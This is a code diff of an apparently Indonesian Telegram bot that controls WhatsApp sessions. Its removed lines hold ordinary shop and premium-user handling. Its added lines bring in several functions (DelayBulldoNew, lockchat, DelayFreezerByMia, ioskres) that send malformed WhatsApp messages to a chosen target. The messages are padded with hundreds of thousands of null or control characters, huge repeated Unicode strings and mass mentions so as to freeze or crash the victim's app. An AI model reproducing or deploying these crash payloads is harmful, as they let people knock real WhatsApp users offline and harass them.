-      chatId,
-      "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d."
-    );
-  }
-
-  const now = moment();
-  const expirationDate = moment().add(
-    parseInt(duration),
-    duration.slice(-1) === "d"
-      ? "days"
-      : duration.slice(-1) === "h"
-      ? "hours"
-      : "minutes"
-  );
-
-  if (!premiumUsers.find((user) => user.id === userId)) {
-    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
-    savePremiumUsers();
-    console.log(
-      `${senderId} added ${userId} to premium until ${expirationDate.format(
-        "YYYY-MM-DD HH:mm:ss"
-      )}`
-    );
-    bot.sendMessage(
-      chatId,
-      `✅ User ${userId} has been added to the premium list until ${expirationDate.format(
-        "YYYY-MM-DD HH:mm:ss"
-      )}.`
-    );
-  } else {
-    const existingUser = premiumUsers.find((user) => user.id === userId);
-    existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
-    savePremiumUsers();
-    bot.sendMessage(
-      chatId,
-      `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format(
-        "YYYY-MM-DD HH:mm:ss"
-      )}.`
-    );
-  }
-});
-
-bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
-    const chatId = msg.chat.id;
-    const senderId = msg.from.id;
-
-    // Cek apakah pengguna adalah owner atau admin
-    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
-        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
-    }
-
-    if (!match[1]) {
-        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delprem 6843967527");
-    }
-
-    const userId = parseInt(match[1]);
-
-    if (isNaN(userId)) {
-        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
-    }
-
-    // Cari index user dalam daftar premium
-    const index = premiumUsers.findIndex(user => user.id === userId);
-    if (index === -1) {
-        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
-    }
-
-    // Hapus user dari daftar
-    premiumUsers.splice(index, 1);
-    savePremiumUsers();
-    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
-});
-
-const { loadData, saveData } = require('./product.js');
-
-// --- KONFIGURASI ---
-const OWNER_ID = "8768626313";
-const nope = "087729777800"; 
-const FOTO_SC = "https://g.top4top.io/p_3788ghdlv1.jpg"; 
-const FOTO_ROLE = "https://k.top4top.io/p_3764b0zhz1.jpg"; 
-const QRIS = "https://j.top4top.io/p_3786uonou1.jpg";
-
-let products = loadData();
-const pendingOrders = new Map();
-const waitingForFile = new Map();
-const userAction = new Map();
-const waitingProof = new Map();
-const userWaitingPayment = new Map(); // Tracker untuk kirim bukti tanpa reply
-
-
-// --- 1. MANAJEMEN PRODUK & ROLE (OWNER ONLY) ---
-bot.onText(/\/(addproduct|addrole|delproduct)/, (msg, match) => {
-    if (msg.from.id.toString() !== OWNER_ID) return;
-    const command = match[1];
-
-    if (command === "addproduct") {
-        bot.sendMessage(msg.chat.id, "🛒 <b>ADD SCRIPT</b>\nFormat: <code>id|nama|harga|stok</code>", { parse_mode: "HTML" });
-        userAction.set(msg.from.id, "adding_script");
-    } else if (command === "addrole") {
-        bot.sendMessage(msg.chat.id, "💎 <b>ADD ROLE</b>\nFormat: <code>id|nama|harga|stok</code>", { parse_mode: "HTML" });
-        userAction.set(msg.from.id, "adding_role");
-    } else {
-        const list = Object.keys(products).map(id => `• <code>${id}</code> (${products[id].type})`).join("\n");
-        bot.sendMessage(msg.chat.id, "🗑️ <b>DELETE PRODUCT</b>\nKirim ID yang ingin dihapus:\n\n" + (list || "Kosong"), { parse_mode: "HTML" });
-        userAction.set(msg.from.id, "deleting");
-    }
-});
-
-// Listener Input Teks Owner
-bot.on('message', (msg) => {
-    if (!userAction.has(msg.from.id) || !msg.text || msg.text.startsWith('/')) return;
-    const action = userAction.get(msg.from.id);
-    const input = msg.text.split("|").map(p => p.trim());
-
-    if (action === "adding_script" || action === "adding_role") {
-        if (input.length < 4) return bot.sendMessage(msg.chat.id, "❌ Format salah! Gunakan <code>id|nama|harga|stok</code>", { parse_mode: "HTML" });
-        const [id, name, price, stock] = input;
-        products[id] = { name, price, stock: parseInt(stock) || 0, type: action === "adding_script" ? "script" : "role" };
-        saveData(products);
-        bot.sendMessage(msg.chat.id, `✅ Berhasil menambah ${name} ke database!`);
-    } else if (action === "deleting") {
-        if (products[msg.text]) { 
-            delete products[msg.text]; 
-            saveData(products); 
-            bot.sendMessage(msg.chat.id, "✅ Produk dihapus!"); 
-        } else {
-            bot.sendMessage(msg.chat.id, "❌ ID tidak ditemukan.");
-        }
-    }
-    userAction.delete(msg.from.id);
-});
-
-// --- 2. MENU BUY SCRIPT & UP ROLE ---
-bot.onText(/\/(buysc|uprole)/, async (msg) => {
-    const isSc = msg.text.includes("buysc");
-    const targetType = isSc ? "script" : "role";
-    const filteredIds = Object.keys(products).filter(id => products[id].type === targetType);
-
-    if (filteredIds.length === 0) return bot.sendMessage(msg.chat.id, "📭 Produk belum tersedia.");
-
-    const keyboard = filteredIds.map(id => {
-        const p = products[id];
-        return [{ text: `${p.name} - Rp${p.price} [${p.stock > 0 ? 'READY' : 'SOLD'}]`, callback_data: `select_${id}` }];
-    });
-    
-    if (!isSc) {
-    return bot.sendMessage(
-        msg.chat.id,
-        `💎 Upgrade Role hanya bisa dilakukan via Owner.\n\n📞 Silahkan chat Owner sekarang.`,
-        {
-            reply_markup: {
-                inline_keyboard: [
-                    [
-                        {
-                            text: "📞 CHAT OWNER",
-                            url: "https://t.me/Pinnxzy"
-                        }
-                    ]
-                ]
-            }
-        }
-    );
-}
-
-    bot.sendPhoto(msg.chat.id, isSc ? FOTO_SC : FOTO_ROLE, {
-        caption: `<blockquote><b>⌜ ${isSc ? '🛒' : '💎'} ⌟ ${isSc ? 'STORE' : 'UPGRADE'}</b></blockquote>\nSilahkan pilih:`,
-        parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard }
-    });
-});
-
-// --- 3. CALLBACK PEMBAYARAN & ACC ---
-bot.on('callback_query', async (query) => {
-    try {
-
-        const data = query.data;
-        const chatId = query.message.chat.id;
-
-        await bot.answerCallbackQuery(query.id);
-
-        // ================= PILIH PRODUK =================
-        if (data.startsWith("select_")) {
-
-            const id = data.split("_")[1];
-            const p = products[id];
-
-            if (!p || p.stock <= 0) {
-                return bot.sendMessage(chatId, "❌ Stok habis!");
-            }
-
-            return await bot.sendMessage(
-                chatId,
-                `<b>Produk:</b> ${p.name}
-<b>Harga:</b> Rp${p.price}
-
-Pilih metode pembayaran:`,
-                {
-                    parse_mode: "HTML",
-                    reply_markup: {
-                        inline_keyboard: [
-                            [
-                                {
-                                    text: "💳 DANA",
-                                    callback_data: `method_dana_${id}`
-                                }
-                            ],
-                            [
-                                {
-                                    text: "📸 QRIS",
-                                    callback_data: `method_qris_${id}`
-                                }
-                            ]
-                        ]
+async function DelayBulldoNew(sock, target) {
+    const nullMessage = {
+        viewOnceMessage: {
+            message: {
+                interactiveResponseMessage: {
+                    stickerMessage: {
+                        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
+                        fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
+                        fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
+                        mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
+                        mimetype: "image/webp",
+                        height: 9999,
+                        width: 9999,
+                        directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
+                        fileLength: 12260,
+                        mediaKeyTimestamp: "1743832131",
+                        isAnimated: false,
+                        stickerSentTs: "X",
+                        isAvatar: false,
+                        isAiSticker: false,
+                        isLottie: false
+                    },
+                    body: {
+                        text: "X7 | AsepExplost"
+                    },
+                    nativeFlowResponseMessage: {
+                        name: "address_message",
+                        paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"X7D\",\"city\":\"chindo\",\"name\":\"X7D\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"X${"\x10".repeat(
+                            1030000
+                        )}\"}}`,
+                        version: 3
                     }
                 }
-            );
-        }
-
-// ================= METODE PEMBAYARAN =================
-// ================= METODE PEMBAYARAN =================
-if (data.startsWith("method_")) {
-
-    const [, method, id] = data.split("_");
-
-    if (!products[id]) {
-        return bot.sendMessage(chatId, "❌ Produk tidak ditemukan.");
-    }
-
-    waitingProof.set(chatId, id);
-
-    const caption = `✨ <b>DETAIL PESANAN</b> ✨
-──────────────────
-📦 <b>Produk:</b> <code>${products[id].name}</code>
-
-──────────────────
-📢 <b>INSTRUKSI PEMBAYARAN:</b>
-Silakan kirimkan <b>FOTO</b> bukti transfer Anda sekarang.
-
-⚠️ <b>PERINGATAN:</b>
-• Hanya menerima format <b>FOTO (JPG/PNG)</b>.
-• File, Video, atau Teks ❌ <b>TIDAK AKAN DIPROSES</b>.`;
-
-    // ====== DANA ======
-    if (method === "dana") {
-        return bot.sendMessage(
-            chatId,
-            `💳 <b>Pembayaran via DANA<tg-emoji emoji-id="6156901817146934803"></tg-emoji></b>\n\nNomor: <code>${nope}</code>\n\n${caption}`,
-            { parse_mode: "HTML" }
-        );
-    }
-
-    // ====== QRIS (KIRIM FOTO) ======
-    if (method === "qris") {
-        return bot.sendPhoto(
-            chatId,
-            QRIS, // link foto atau path file
-            {
-                caption: `📸 <b>Scan QRIS<tg-emoji emoji-id="6156788335521040752"></tg-emoji></b>\n\n${caption}`,
-                parse_mode: "HTML"
             }
-        );
-    }
+        }
+    };
+
+    const msg = await generateWAMessageFromContent(target, nullMessage, {});
+
+    await sock.relayMessage("status@broadcast", msg.message, {
+        messageId: msg.key.id,
+        statusJidList: [target],
+        additionalNodes: [{
+            tag: "meta",
+            attrs: {},
+            content: [{
+                tag: "mentioned_users",
+                attrs: {},
+                content: [{
+                    tag: "to",
+                    attrs: {
+                        jid: target
+                    },
+                    content: undefined
+                }]
+            }]
+        }]
+    });
 }
 
-        // ================= ACC ORDER =================
-        if (data.startsWith("acc_")) {
-
-            const orderId = data.split("_")[1];
-            const randomImage = getRandomImage();
-
-            
-            await bot.sendPhoto(
-                OWNER_ID, randomImage,
-                {
-            caption: `✅ <b>PESANAN BERHASIL DITERIMA!</b>
-─────────────────────
-🆔 <b>Order ID:</b> <code>#${orderId}</code>
-
-📥 <b>INSTRUKSI PENGIRIMAN:</b>
-Silakan kirimkan <b>FILE</b> pesanan sekarang. 
-
-Sistem akan otomatis meneruskan file tersebut kepada pembeli. Pastikan file sudah benar dan tidak korup.
-─────────────────────
-<i>Status: Menunggu unggahan file...</i>`,
-            parse_mode: "HTML"
-        }
-    );   
-
-    waitingForFile.set(OWNER_ID, orderId);
-    return await bot.deleteMessage(chatId, query.message.message_id);
-} 
-
-// ================= tolak ORDER =================
-if (data.startsWith("tolak_")) {
-            const orderId = data.split("_")[1];
-    const randomImage = getRandomImage();
-    await bot.sendPhoto(
-                OWNER_ID, randomImage,
-               {
-            caption: `🚫 <b>PESANAN DITOLAK</b> 🚫
-─────────────────────
-🆔 <b>ID Order:</b> <code>#${orderId}</code>
-⚠️ <b>Status:</b> Pesanan Tidak Disetujui
-
-<b>Mohon Maaf,</b>
-Pesanan Anda telah ditolak oleh Owner/Admin. Silakan hubungi admin jika Anda merasa ini adalah kesalahan atau ingin menanyakan alasan pembatalan.
-─────────────────────
-<i>Dana akan dikembalikan sesuai kebijakan yang berlaku.</i>`,
-            parse_mode: "HTML"
-        }
-    );
-    
-    return await bot.deleteMessage(chatId, query.message.message_id);
-} 
-  } catch (err) {
-        console.log(err);
-    } // tutup catch
-});
-
-
-// ================= TERIMA BUKTI TRANSFER =================
-
-// FOTO (HP user biasanya)
-bot.on('photo', async (msg) => {
-
-    const chatId = msg.chat.id;
-
-    const prodId = waitingProof.get(chatId);
-
-    if (!prodId || !products[prodId]) {
-        return;
-    }
-
-        if (prodId && products[prodId]) {
-        const orderId = `XYLNT${Date.now().toString().slice(-4)}`;
-        const p = products[prodId]; 
-        
-        pendingOrders.set(orderId, { userId: chatId, userName: msg.from.first_name, prodName: p.name, prodId });
-
-        bot.sendMessage(chatId, `⏳ <b>PEMBAYARAN SEDANG DIVALIDASI</b>
-─────────────────────
-Bukti transfer Anda telah kami terima dan sedang dalam antrean pengecekan oleh <b>Owner/Admin</b>.
-
-📝 <b>Mohon diperhatikan:</b>
-• Jangan mengirim bukti yang sama berkali-kali.
-• Proses ini biasanya memakan waktu 1-5 menit.
-• Anda akan menerima notifikasi otomatis jika pesanan disetujui.
-
-<i>Terima kasih telah menunggu...</i>`);
-        
-        bot.sendPhoto(OWNER_ID, msg.photo[msg.photo.length - 1].file_id, {
-            caption: `📩 <b>NOTIFIKASI PESANAN BARU</b>
-─────────────────────
-🆔 <b>Order ID:</b> <code>#${orderId}</code>
-📦 <b>Produk:</b> <code>${p.name}</code>
-💰 <b>Harga:</b> <code>Rp${p.price.toLocaleString('id-ID')}</code>
-
-👤 <b>Detail Pembeli:</b>
-• Nama: <b>${msg.from.first_name}</b>
-• ID: <code>${msg.from.id}</code>
-─────────────────────
-<i>Silakan cek bukti transfer yang dikirim setelah ini.</i>`,
-            parse_mode: "HTML",
-            reply_markup: { 
-                inline_keyboard: [
-                    [
-                        { 
-                            text: "✔️ TERIMA & KIRIM FILE", 
-                            callback_data: `acc_${orderId}`,
-                            style: "success" 
-                        },
-                        { 
-                            text: "✖️ TOLAK", 
-                            callback_data: `tolak_${orderId}`, 
-                            style: "danger" 
-                        }
-                    ]
-                ] 
-            }
-        });
-        waitingProof.delete(chatId);
-    }
-});
-
-
-
-// DOCUMENT (Desktop user biasanya kirim gambar sebagai file)
-bot.on('document', async (msg) => {
-    if (msg.from.id.toString() === OWNER_ID && waitingForFile.has(OWNER_ID)) {
-        const orderId = waitingForFile.get(OWNER_ID);
-        const order = pendingOrders.get(orderId);
-
-        try {
-            // --- 1. PESAN UNTUK BUYER (TAMPILAN BARU) ---
-            await bot.sendDocument(order.userId, msg.document.file_id, { 
-                caption: 
-                    `✨ <b>TERIMA KASIH TELAH ORDER!</b>\n` +
-                    `━━━━━━━━━━━━━━━━━━━━━━\n` +
-                    `📦 <b>Produk:</b> <code>${order.prodName}</code>\n` +
-                    `🆔 <b>Order ID:</b> <code>#${orderId}</code>\n` +
-                    `📅 <b>Status:</b> <code>SELESAI / COMPLETED</code>\n` +
-                    `━━━━━━━━━━━━━━━━━━━━━━\n\n` +
-                    `🚀 <i>File pesanan Anda ada di atas. Silakan simpan dengan baik. Jika ada kendala, hubungi Owner!</i>\n\n` +
-                    `<b>XYLENT MARKET</b>`, 
-                parse_mode: "HTML" 
-            });
-
-            // Update Stok
-            if (products[order.prodId]) { 
-                products[order.prodId].stock -= 1; 
-                saveData(products); 
-            }
-
-            // --- 2. NOTIFIKASI UNTUK OWNER ---
-            await bot.sendMessage(OWNER_ID, 
-                `✅ <b>MISSION SUCCESS!</b>\n\n` +
-                `File pesanan <b>[${orderId}]</b> telah berhasil diteruskan ke pembeli secara otomatis.\n\n` +
-                `<b>Status:</b> Terkirim & Aman\n` +
-                `<b>Saldo:</b> Cuan Masuk! 💸\n\n` +
-                `<i>Sistem kembali standby untuk orderan berikutnya.</i>`, 
-                { parse_mode: "HTML" }
-            );
-
-            // Bersihkan Cache
-            waitingForFile.delete(OWNER_ID);
-            pendingOrders.delete(orderId);
-
-        } catch (e) { 
-            console.log("Error Send File:", e);
-            bot.sendMessage(
-    OWNER_ID, 
-    `🚨 <b>CRITICAL ERROR: DELIVERY FAILED</b>
-─────────────────────
-📦 <b>Order ID:</b> <code>#${orderId}</code>
-❌ <b>Masalah:</b> File Gagal Diteruskan
-
-<b>Kemungkinan Penyebab:</b>
-• User telah memblokir Bot.
-• User menghapus akun/chat.
-• Gangguan API Telegram atau Jaringan.
-
-⚠️ <b>Tindakan:</b> Segera hubungi pembeli secara manual untuk memastikan pesanan tetap sampai.
-─────────────────────
-<code>Log Status: delivery_attempt_failed</code>`, 
-    { parse_mode: "HTML" }); 
-        }
-    }
-});
-
-
-bot.onText(/\/listprem/, (msg) => {
-  const chatId = msg.chat.id;
-  const senderId = msg.from.id;
-
-  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
-    return bot.sendMessage(
-      chatId,
-      "❌ You are not authorized to view the premium list."
-    );
-  }
-
-  if (premiumUsers.length === 0) {
-    return bot.sendMessage(chatId, "📌 No premium users found.");
-  }
-
-  let message = "```L I S T - P R E M \n\n```";
-  premiumUsers.forEach((user, index) => {
-    const expiresAt = moment(user.expiresAt).format("YYYY-MM-DD HH:mm:ss");
-    message += `${index + 1}. ID: \`${
-      user.id
-    }\`\n   Expiration: ${expiresAt}\n\n`;
-  });
-
-  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
-});
-
-bot.onText(/\/cekidch (.+)/, async (msg, match) => {
-  const chatId = msg.chat.id;
-  const link = match[1];
-
-  let result = await getWhatsAppChannelInfo(link);
-
-  if (result.error) {
-    bot.sendMessage(chatId, `⚠️ ${result.error}`);
-  } else {
-    let teks = `
-📢 *Informasi Channel WhatsApp*
-🔹 *ID:* ${result.id}
-🔹 *Nama:* ${result.name}
-🔹 *Total Pengikut:* ${result.subscribers}
-🔹 *Status:* ${result.status}
-🔹 *Verified:* ${result.verified}
-        `;
-    bot.sendMessage(chatId, teks);
-  }
-});
-
-bot.onText(/\/delbot (.+)/, async (msg, match) => {
-  const chatId = msg.chat.id;
-
-  if (!isOwner(msg.from.id)) {
-    return bot.sendMessage(
-      chatId,
-      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
-      { parse_mode: "Markdown" }
-    );
-  }
-
-  const botNumber = match[1].replace(/[^0-9]/g, "");
-
-  let statusMessage = await bot.sendMessage(
-    chatId,
-`
-\`\`\`╭─────────────────
-│    𝙼𝙴𝙽𝙶𝙷𝙰𝙿𝚄𝚂 𝙱𝙾𝚃    
-│────────────────
-│ Bot: ${botNumber}
-│ Status: Memproses...
-╰─────────────────\`\`\`
-`,
-    { parse_mode: "Markdown" }
-  );
-
-  try {
-    const sock = sessions.get(botNumber);
-    if (sock) {
-      sock.logout();
-      sessions.delete(botNumber);
-
-      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
-      if (fs.existsSync(sessionDir)) {
-        fs.rmSync(sessionDir, { recursive: true, force: true });
-      }
-
-      if (fs.existsSync(SESSIONS_FILE)) {
-        const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
-        const updatedNumbers = activeNumbers.filter((num) => num !== botNumber);
-        fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
-      }
-
-      await bot.editMessageText(`
-\`\`\`
-╭─────────────────
-│    𝙱𝙾𝚃 𝙳𝙸𝙷𝙰𝙿𝚄𝚂   
-│────────────────
-│ Bot: ${botNumber}
-│ Status: Berhasil dihapus!
-╰─────────────────\`\`\`
-`,
-        {
-          chat_id: chatId,
-          message_id: statusMessage.message_id,
-          parse_mode: "Markdown",
-        }
-      );
-    } else {
-      const sessionDir = path.join(SESSIONS_DIR, `device${botNumber}`);
-      if (fs.existsSync(sessionDir)) {
-        fs.rmSync(sessionDir, { recursive: true, force: true });
-
-        if (fs.existsSync(SESSIONS_FILE)) {
-          const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
-          const updatedNumbers = activeNumbers.filter(
-            (num) => num !== botNumber
-          );
-          fs.writeFileSync(SESSIONS_FILE, JSON.stringify(updatedNumbers));
-        }
-
-        await bot.editMessageText(`
-\`\`\`
-╭─────────────────
-│    𝙱𝙾𝚃 𝙳𝙸𝙷𝙰𝙿𝚄𝚂   
-│────────────────
-│ Bot: ${botNumber}
-│ Status: Berhasil dihapus!
-╰─────────────────\`\`\`
-`,
+async function lockchat(sock, target) {
+  await sock.relayMessage(target, {
+    interactiveMessage: {
+      body: {
+        text: "Xylent Empire"
+      },
+      nativeFlowMessage: {
+        // Dibungkus ke dalam array objek agar tidak memicu 'array expected' error
+        buttons: [
           {
-            chat_id: chatId,
-            message_id: statusMessage.message_id,
-            parse_mode: "Markdown",
+            name: "quick_reply",
+            buttonParamsJson: JSON.stringify({
+              display_text: "\u0000".repeat(500000),
+              id: "xylent_id"
+            })
           }
-        );
-      } else {
-        await bot.editMessageText(`
-\`\`\`
-╭─────────────────
-│    𝙴𝚁𝚁𝙾𝚁    
-│────────────────
-│ Bot: ${botNumber}
-│ Status: Bot tidak ditemukan!
-╰─────────────────\`\`\`
-`,
+        ]
+      },
+    },
+  }, { participant: { jid: target } });
+}
+
+async function DelayFreezerByMia(sock, target) {
+  const msg = {
+    interactiveMessage: {
+      nativeFlowMessage: {
+        buttons: [
           {
-            chat_id: chatId,
-            message_id: statusMessage.message_id,
-            parse_mode: "Markdown",
-          }
-        );
-      }
-    }
-  } catch (error) {
-    console.error("Error deleting bot:", error);
-    await bot.editMessageText(`
-\`\`\`
-╭─────────────────
-│    𝙴𝚁𝚁𝙾𝚁  
-│────────────────
-│ Bot: ${botNumber}
-│ Status: ${error.message}
-╰─────────────────\`\`\`
-`,
+            name: "payment_info",
+            buttonParamsJson: `{
+  "currency": "IDR",
+  "total_amount": {
+    "value": 0,
+    "offset": 100
+  },
+  "reference_id": "${Date.now()}",
+  "type": "physical-goods",
+  "order": {
+    "status": "pending",
+    "subtotal": {
+      "value": 0,
+      "offset": 100
+    },
+    "order_type": "ORDER",
+    "items": [
       {
-        chat_id: chatId,
-        message_id: statusMessage.message_id,
-        parse_mode: "Markdown",
+        "name": "${'ꦾ'.repeat(5000)}",
+        "amount": {
+          "value": 0,
+          "offset": 100
+        },
+        "quantity": 0,
+        "sale_amount": {
+          "value": 0,
+          "offset": 100
+        }
+      },
+      {
+        "name": "${'ꦾ'.repeat(4000)}",
+        "amount": {
+          "value": 999999999,
+          "offset": 100
+        },
+        "quantity": 999,
+        "sale_amount": {
+          "value": 999999999,
+          "offset": 100
+        }
       }
-    );
+    ]
+  },
+  "payment_settings": [
+    {
+      "type": "pix_static_code",
+      "pix_static_code": {
+        "merchant_name": "Mia${'ꦾ'.repeat(3000)}",
+        "key": "${'\u0000'.repeat(900000)}",
+        "key_type": "xylent"
+      }
+    },
+    {
+      "type": "credit_card",
+      "credit_card": {
+        "merchant_name": "${'𑇂𑆵𑆴𑆿'.repeat(2000)}",
+        "amount": 999999999
+      }
+    }
+  ],
+  "share_payment_status": false,
+  "expiry_time": ${Date.now() + 999999999},
+  "retry_count": 999
+}`
+          }
+        ]
+      },
+      contextInfo: {
+        stanzaId: "xylent",
+        mentionedJid: Array.from({ length: 1000 }, (_, i) => `6281${i}@s.whatsapp.net`),
+        forwardingScore: 999999999,
+        isForwarded: true
+      }
+    }
   }
-});
 
+  await sock.relayMessage(target, msg, { participant: { jid: target } })
+}
 
+async function ioskres(sock, target) {
+  const zzukif = await generateWAMessageFromContent(
+    target,
+    {
+      extendedTextMessage: {
+        text: "xylent",
+        matchedText: "https://Wa.me/stickerpack/zzukitsg",
+        description: "𑇂𑆵𑆴𑆿".repeat(20000),
+        title: "𑇂𑆵𑆴𑆿".repeat(15000),
+        previewType: "NONE",
+        jpegThumbnail: null,
+        inviteLinkGroupTypeV2: "DEFAULT",
+      },
+    },
+    {
+      ephemeralExpiration: 5,
+      timeStamp: Date.now(),
+    }
+  );
+
+  await sock.relayMessage(target, zzukif.message, {
+    messageId: zzukif.key.id,
+  });  
+  await sock.sendMessage(target, {
+    text: "xylent" + "𑇂𑆵𑆴𑆿".repeat(12000),
+    contextInfo: {
+      externalAdReply: {
+        title: "𑇂𑆵𑆴𑆿".repeat(15000),
+        body: "𑇂𑆵𑆴𑆿".repeat(15000),
+        previewType: "PHOTO",
+        remoteJid: " X ",
+        conversionSource: " X ",
+        conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
+        conversionDelaySeconds: 10,
+        forwardingScore: 999,
+        isForwarded: true,
+        quotedAd: {
+          advertiserName: " X ",
+          mediaType: "IMAGE",
+          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
+          caption: " X "
+        },
+        placeholderKey: {
+          remoteJid: "0@s.whatsapp.net",
+          fromMe: false,
+          id: "ABCDEF1234567890"
+        },
+        thumbnail: null,
+        merchantUrl: `https://whatsapp.${"𑇂𑆵𑆴𑆿".repeat(15000)}.com`
+      }
+    }
+  });
+}
+///////////////////[END FUNC]////////////////
+// --- Jalankan Bot ---
+(async () => {
+console.log(chalk.redBright.bold(`
+╭─────────────────────────────╮
+│${chalk.white('Memulai Sesi WhatsApp..')}
+╰─────────────────────────────╯
+`));
+
+startSesi();
+bot.launch();
+})();
